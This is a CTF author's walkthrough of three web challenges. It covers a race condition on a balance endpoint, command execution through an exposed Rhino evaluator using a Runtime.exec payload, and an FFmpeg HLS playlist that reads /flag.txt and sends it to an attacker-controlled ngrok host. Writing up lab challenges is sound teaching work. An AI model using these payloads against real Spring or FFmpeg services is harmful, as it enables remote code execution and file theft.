---
title: Web challenges created by 0xRam in TamilCTFxSniphers 2.0
published: 2025-03-08
description: Walkthrough's for my web challenges.
image: https://tamilctf.pages.dev/build/images/TAMIL-CTF-LOGO.27444f54efa03a50a91a62270c8e7a43.png
tags: [rhino, spring,ffmpeg,race,ctf]
category: CTF
draft: false      # Set only if the post's language differs from the site's language in `config.ts`
---

# Rays

![Screenshot](https://raw.githubusercontent.com/0xraminfosec/imagerepo/refs/heads/main/Screenshot%20from%202025-03-09%2013-01-57.png "chall")  

As mentioned in the description, this application is still in the development stage. By visiting the provided URL, we land on the login/register page. After logging in, we are redirected to a dashboard displaying various products with different prices. Initially, we have only **50 Rs** in our account.  

There is a product called `flag` that costs **70 Rs**.  

![Screenshot](https://raw.githubusercontent.com/0xraminfosec/imagerepo/refs/heads/main/Pasted%20image.png "chall")  

Since we only have **50 Rs**, we cannot purchase the flag.  

![Screenshot](https://raw.githubusercontent.com/0xraminfosec/imagerepo/refs/heads/main/Screenshot%20from%202025-03-09%2013-16-23.png "chall")  

When we attempt to buy the flag, we receive an **"Insufficient balance"** error. However, if we closely analyze the error message, we discover a source code leak in `/app/app.py`. By examining the source code, we find a hidden endpoint called **`/lend_money`**.  

![Screenshot](https://raw.githubusercontent.com/0xraminfosec/imagerepo/refs/heads/main/Screenshot%20from%202025-03-09%2013-19-22.png "chall")  

Visiting the `/lend_money` endpoint grants us an additional **10 Rs**. However, if we try to visit the endpoint again, we are redirected back to the dashboard, preventing further balance increments.  

## Exploiting Race Condition  
To bypass this limitation, we can exploit a **race condition**.  

Reference: [PortSwigger - Race Conditions](https://portswigger.net/web-security/race-conditions).  

Since we have already visited the `/lend_money` endpoint once, the race condition will not work on the current account. To exploit this, we need to **create a new account** and intercept the `/lend_money` request using **Burp Suite**.  

### Steps to Exploit:
1. Send the `/lend_money` request to **Repeater** or **Turbo Intruder** (available in the BApp store).  
2. Set **null payloads** to the `User-Agent` header.  
3. Start the attack.  

By doing this, we can observe that the balance increases beyond the initial **10 Rs**.  

![Screenshot](https://raw.githubusercontent.com/0xraminfosec/imagerepo/refs/heads/main/Screenshot%20from%202025-03-09%2016-20-37.png "chall")  

Now, with the increased balance, we can successfully buy the **flag**. 🎉  

---

# Rhinocorp

![Screenshot](https://raw.githubusercontent.com/0xraminfosec/imagerepo/refs/heads/main/Screenshot%20from%202025-03-09%2016-26-58.png "chall")

Visiting the given URL, we don’t get any useful information about the web application. However, the error page reveals details about the framework used. When we encounter a **404 error page**, it shows a **Whitelabel Error Page**, which indicates that the application is built using **Java Spring Framework**.  

![Screenshot](https://raw.githubusercontent.com/0xraminfosec/imagerepo/refs/heads/main/Screenshot%20from%202025-03-09%2016-31-22.png "chall")

We can search for common **Spring Framework** issues on Google, leading us to `actuator`.

Reference: [Spring Security Actuator Endpoints](https://0xram.com/posts/spring-security/#exposed-actuator-endpoints).

The `/actuator/mappings` endpoint is exposed, allowing us to view all controllers and service mappings.

![Screenshot](https://raw.githubusercontent.com/0xraminfosec/imagerepo/refs/heads/main/Screenshot%20from%202025-03-09%2016-39-11.png "chall")

By inspecting the exposed mappings, we find the `/dev-exec` endpoint. Visiting this endpoint reveals an **internal developer code evaluator**.

When we input `1+1`, it returns `2`.

It also throws an error.The error message includes **`org.mozilla.javascript.EcmaError`**, which, when researched, leads us to **Rhino**, a JavaScript engine written in Java. This suggests that we can execute JavaScript code, including **`eval`**.  

Since we can execute JavaScript code, we can use `eval()` to execute arbitrary commands.

## Exploiting Rhino JavaScript Engine for Code Execution

## Understanding the Vulnerability

Rhino is a JavaScript engine implemented in Java. When improperly secured, it allows **direct access to Java classes**, enabling an attacker to execute system commands through Java’s `Runtime` class.

In this challenge, we found an exposed `/dev-exec` endpoint that evaluates JavaScript expressions. Testing with `1+1` returned `2`, confirming that the input was executed within a JavaScript context.

Additionally, an error message containing `org.mozilla.javascript.EcmaError` indicated that the application was using **Rhino**.

---

## Exploit Code

```javascript
eval(a=java.lang.Runtime.getRuntime().exec('cat /app/flag.txt').getInputStream().readAllBytes())
```
![Screenshot](https://raw.githubusercontent.com/0xraminfosec/imagerepo/refs/heads/main/Screenshot%20from%202025-03-09%2016-50-15.png "chall")

### Breakdown of the Exploit

#### **1. Accessing Java Classes**
Rhino allows direct access to Java classes:
```javascript
java.lang.Runtime.getRuntime()
```
This gives us a reference to the **Java Runtime Environment (JRE)**, which can execute system commands.

#### **2. Executing a System Command**
```javascript
.exec('cat /app/flag.txt')
```
This runs the Linux `cat` command to read the contents of the `flag.txt` file.

#### **3. Capturing the Output**
```javascript
.getInputStream().readAllBytes()
```
The output of the command is stored in an **InputStream**, which we fully read using `.readAllBytes()`.

#### **4. Evaluating the Output**
```javascript
eval(a= ...)
```
- The flag data is assigned to variable `a`.
- `eval()` executes the result, allowing us to retrieve and print the flag.

---


# Gif

![Screenshot](https://raw.githubusercontent.com/0xraminfosec/imagerepo/refs/heads/main/Screenshot%20from%202025-03-09%2017-06-12.png "chall")

We are given a **video-to-GIF converter** application. Upon inspecting the source code, we find a comment mentioning **FFmpeg**, an open-source multimedia framework.

A quick Google search reveals that **FFmpeg is vulnerable to Server-Side Request Forgery (SSRF) and Local File Read (LFI) attacks** via specially crafted **HLS (HTTP Live Streaming) playlists** and **AVI file uploads**.

#### References:
- [FFmpeg Official Documentation](https://ffmpeg.org/ffmpeg.html)
- [HackerOne Report - FFmpeg SSRF & LFI](https://hackerone.com/reports/1062888)

---

## Exploiting FFmpeg for Local File Read

### Step 1: Understanding HLS & FFmpeg Vulnerabilities

FFmpeg supports **HLS (HTTP Live Streaming)**, which allows referencing external media files. By injecting an HLS playlist into an uploaded video file, we can force the application to request arbitrary files, leading to **LFI (Local File Inclusion)**.

We can create an **AVI file** with an embedded HLS directive that tricks FFmpeg into reading local files.

### Step 2: Hosting a Malicious HLS Playlist

To exploit the LFI vulnerability, we need to **host a malicious `.m3u8` playlist** on our own server. This playlist will reference the target file (`/flag.txt`) and send its contents to our remote server.

**Malicious `header.m3u8` content:**

```
#EXTM3U
#EXT-X-MEDIA-SEQUENCE:0
#EXTINF:10.0,
concat:http://0.tcp.in.ngrok.io:13529/header.m3u8|subfile,,start,0,end,10000,,:/flag.txt
#EXT-X-ENDLIST
```

### Step 3: Creating & Uploading the Malicious AVI File

To trigger the exploit, we need to upload a video file that references our hosted HLS playlist.

1. **Create a malicious `.avi` file** with the following embedded HLS directives:

   ```
   HLS = HTTP LIVE STREAMING
   ```

2. **Upload the `.avi` file** to the target application.

3. Once the application processes the file, **FFmpeg will fetch our HLS playlist**, which in turn will read `/flag.txt` and send it to our server.

### Step 4: Capturing the Flag

On our server, we will receive a request containing the **contents of `/flag.txt`**, which likely holds the flag.

Example of the server output after a successful exploit:

![Screenshot](https://raw.githubusercontent.com/0xraminfosec/imagerepo/refs/heads/main/video3.png "chall")

---
